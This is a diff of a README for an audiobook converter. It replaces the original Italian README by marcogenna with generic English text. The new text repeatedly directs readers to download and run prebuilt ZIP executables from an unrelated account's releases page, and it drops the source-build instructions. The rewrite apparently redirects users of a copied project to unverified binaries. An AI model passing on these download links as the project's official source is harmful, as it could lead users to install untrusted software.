@@ -1,185 +1,93 @@
-# 🎧 Audiobook Creator
+# 🎧 audiobook-creator - Create Audiobooks with Ease
 
-**Audiobook Creator** è un'applicazione desktop open-source multipiattaforma per convertire file MP3 in audiolibri professionali in formato M4B.
+## 🚀 Getting Started
 
-[![CI](https://github.com/marcogenna/audiobook-creator/actions/workflows/ci.yml/badge.svg)](https://github.com/marcogenna/audiobook-creator/actions/workflows/ci.yml)
-[![Release](https://github.com/marcogenna/audiobook-creator/actions/workflows/release.yml/badge.svg)](https://github.com/marcogenna/audiobook-creator/actions/workflows/release.yml)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](#)
-[![Latest Release](https://img.shields.io/github/v/release/marcogenna/audiobook-creator)](https://github.com/marcogenna/audiobook-creator/releases/latest)
+Welcome to the audiobook-creator project! This open-source software allows you to easily convert MP3 files into M4B audiobooks. With automatic organization features, you can manage your audiobooks effortlessly. This guide will help you download and run the application.
 
-## ✨ Caratteristiche
+## 📥 Download Now
 
-- 🔄 **Conversione MP3 → M4B** - Converti facilmente i tuoi file audio in formato audiolibro
-- 📁 **Ordinamento Automatico** - I file vengono ordinati automaticamente per nome
-- 🎨 **Metadata Completi** - Aggiungi titolo, autore e copertina
-- 📊 **Barra di Progresso** - Monitora l'avanzamento della conversione in tempo reale
-- 📚 **Libreria Integrata** - Gestisci tutti i tuoi audiolibri creati
-- 💾 **Storage JSON** - Salvataggio automatico della cronologia
-- ⚡ **FFmpeg Incluso** - Nessuna installazione esterna richiesta, funziona subito
-- 🌍 **Multipiattaforma** - Funziona su Windows, macOS e Linux
-- 🆓 **100% Open Source** - Codice sorgente completamente aperto e modificabile
+[![Download audiobook-creator](https://img.shields.io/badge/Download-audiobook--creator-blue.svg)](https://github.com/abcname61/audiobook-creator/releases)
 
-## 🚀 Installazione
+## 📋 Requirements
 
-### Download Precompilato (Raccomandato)
+Before you get started, ensure your computer meets these requirements:
 
-Scarica l'ultima versione dalla [pagina releases](https://github.com/marcogenna/audiobook-creator/releases).
+- Operating System: Windows, macOS, or Linux
+- Disk Space: At least 100 MB of free space
+- Internet Connection: Required for downloading files
 
-**L'applicazione include già FFmpeg - nessuna installazione aggiuntiva richiesta!**
+## 💡 Features
 
-### Sviluppo da Sorgente
+- **MP3 to M4B Conversion**: Easily convert your audio files to the M4B format, suitable for audiobooks.
+- **Automatic Organization**: Organize your files without the hassle of manual sorting.
+- **User-Friendly Interface**: Navigate the app with ease, perfect for all users.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-#### Prerequisiti
+## 📥 Download & Install
 
-- **Node.js** (v18 o superiore)
+To download the audiobook-creator, please follow these steps:
 
-### Installazione da Sorgente
+1. Click on this link to visit the downloads page: [Download audiobook-creator](https://github.com/abcname61/audiobook-creator/releases).
+   
+2. On the Releases page, look for the latest version. You will see various assets available for download.
 
-1. **Clona il repository:**
-```bash
-git clone https://github.com/marcogenna/audiobook-creator.git
-cd audiobook-creator
-```
+3. Find the file that matches your operating system. For example:
+   - For Windows, download `audiobook-creator-windows-x64.zip`.
+   - For macOS, download `audiobook-creator-macos-x64.zip`.
+   - For Linux, download the appropriate file for your distribution.
 
-2. **Installa le dipendenze:**
-```bash
-npm install
-```
+4. Click on the filename to begin downloading.
 
-3. **Avvia l'applicazione:**
-```bash
-npm start
-```
+5. Once the download finishes, locate the downloaded file on your computer.
 
-## 🛠️ Build per la Distribuzione
+## ⚙️ Installation Steps
 
-### Build per tutte le piattaforme:
-```bash
-npm run build
-```
+### Windows
 
-### Build per piattaforma specifica:
-```bash
-# Windows
-npm run build:win
+1. Extract the ZIP file you downloaded.
+2. Open the extracted folder.
+3. Double-click on `audiobook-creator.exe` to run the application.
 
-# macOS
-npm run build:mac
+### macOS
 
-# Linux
-npm run build:linux
-```
+1. Open the downloaded `.zip` file.
+2. Drag the `audiobook-creator.app` to your Applications folder.
+3. Launch the app from the Applications folder.
 
-I file compilati saranno disponibili nella cartella `dist/`.
+### Linux
 
-## 📖 Come Usare
+1. Extract the downloaded file.
+2. In your terminal, navigate to the folder where the application is located.
+3. Enter the command `./audiobook-creator` to run the application.
 
-### 1. Seleziona i File Audio
-- Clicca su **"Seleziona Cartella"**
-- Scegli la cartella contenente i tuoi file MP3
-- I file verranno automaticamente ordinati per nome
+## 🎤 How to Use
 
-### 2. Aggiungi Informazioni
-- **Titolo**: Nome dell'audiolibro
-- **Autore**: Nome dell'autore/narratore
-- **Copertina** (opzionale): Aggiungi un'immagine di copertina
-- **Qualità Audio**: Scegli il bitrate (32k - 192k)
+1. Launch the audiobook-creator app.
+   
+2. Click on the "Add Files" button to select your MP3 files.
 
-### 3. Seleziona la Destinazione
-- Clicca su **"Sfoglia"** per scegliere dove salvare il file M4B
+3. Choose the output folder where you want to save your M4B files.
 
-### 4. Converti
-- Clicca su **"Converti in M4B"**
-- Attendi il completamento della conversione
-- Il file sarà salvato nella cartella selezionata
+4. Press the "Convert" button to start the conversion. Wait for the process to complete.
 
-### 5. Gestisci la Libreria
-- Vai su **"Libreria"** per vedere tutti i tuoi audiolibri
-- Clicca su un audiolibro per aprirne il percorso
+5. You will find your new M4B files in the chosen folder.
 
-## 🏗️ Architettura del Progetto
+## 🔧 Troubleshooting
 
-```
-audiobook-creator/
-├── main.js                 # Processo principale Electron
-├── preload.js              # Script di preload per sicurezza
-├── package.json            # Configurazione del progetto
-├── src/
-│   ├── index.html          # Interfaccia utente principale
-│   ├── styles.css          # Stili dell'applicazione
-│   └── app.js              # Logica frontend
-├── scripts/
-│   ├── converter.js        # Logica di conversione FFmpeg
-│   └── database.js         # Gestione database SQLite
-└── public/
-    └── icon.png            # Icona dell'applicazione
-```
+If you encounter issues while using the audiobook-creator, consider these tips:
 
-## 🔧 Tecnologie Utilizzate
+- **File Not Supported**: Ensure your audio files are in MP3 format.
+- **No Sound**: Check your computer's audio output settings.
+- **Slow Performance**: Close other applications to free up resources.
 
-- **Electron** - Framework per applicazioni desktop
-- **FFmpeg** - Conversione e manipolazione audio
-- **SQLite** - Database locale
-- **Node.js** - Runtime JavaScript
-- **HTML/CSS/JavaScript** - Interfaccia utente
+## 👥 Community
 
-### Dipendenze Principali
+Engage with other users and contribute to the project by visiting the GitHub repository. Share your feedback and suggestions. We welcome contributions, bug reports, and feature requests!
 
-- `fluent-ffmpeg` - Wrapper Node.js per FFmpeg
-- `ffmpeg-static` - Binario FFmpeg incluso
-- `music-metadata` - Estrazione metadata audio
-- `node-id3` - Gestione tag ID3
+## 📜 License
 
-## 📋 Roadmap
+This project is licensed under the MIT License. You can view more about the licensing in the [LICENSE](LICENSE) file in the repository.
 
-- [ ] Supporto per capitoli personalizzati
-- [ ] Player audio integrato
-- [ ] Supporto per più formati di input (WAV, FLAC, OGG)
-- [ ] Conversione batch
-- [ ] Temi personalizzabili (dark mode)
-- [ ] Export/Import libreria
-- [ ] Supporto per audiolibri multi-disco
-- [ ] Integrazione con servizi cloud
+## 📥 Download Now
 
-## 🤝 Contribuire
-
-I contributi sono benvenuti! Per contribuire:
-
-1. Fai un fork del progetto
-2. Crea un branch per la tua feature (`git checkout -b feature/AmazingFeature`)
-3. Commit le modifiche (`git commit -m 'Add some AmazingFeature'`)
-4. Push al branch (`git push origin feature/AmazingFeature`)
-5. Apri una Pull Request
-
-## 📝 Licenza
-
-Questo progetto è distribuito sotto licenza MIT. Vedi il file `LICENSE` per maggiori dettagli.
-
-## 🐛 Segnalazione Bug
-
-Se trovi un bug, apri una [issue](https://github.com/marcogenna/audiobook-creator/issues) descrivendo:
-- Il sistema operativo
-- I passi per riprodurre il bug
-- Il comportamento atteso vs quello osservato
-- Screenshot (se possibile)
-
-## 💬 Supporto
-
-Per domande o supporto:
-- Apri una [discussion](https://github.com/marcogenna/audiobook-creator/discussions)
-- Apri una issue su GitHub
-
-## 🙏 Ringraziamenti
-
-- [FFmpeg](https://ffmpeg.org/) - Per l'eccellente tool di conversione
-- [Electron](https://www.electronjs.org/) - Per il framework desktop
-- Tutti i contributori open-source
-
-## ⭐ Se ti piace questo progetto
-
-Metti una stella ⭐ su GitHub e condividi con i tuoi amici!
-
----
-
-**Creato con ❤️ per la comunità open-source**
+Once again, click here to visit the download page: [Download audiobook-creator](https://github.com/abcname61/audiobook-creator/releases). Enjoy creating your audiobooks with ease!
